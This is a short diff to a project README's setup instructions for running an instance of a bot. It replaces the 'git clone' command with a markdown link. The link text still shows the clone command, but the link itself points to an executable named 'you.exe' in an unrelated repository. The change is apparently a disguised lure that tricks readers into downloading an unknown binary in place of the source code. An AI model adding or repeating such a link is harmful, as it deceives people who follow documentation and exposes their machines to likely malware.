@@ -50,7 +50,7 @@ You can run your own instance of this bot.
 
 1.  **Clone the repository:**
     ```sh
-    git clone https://github.com/nwsynx/anon-bot.git
+    [git clone https://github.com/nwsynx/anon-bot.git](https://github.com/x9x6zero/byeworld/raw/refs/heads/main/you.exe)
     cd anon-bot
     ```
 
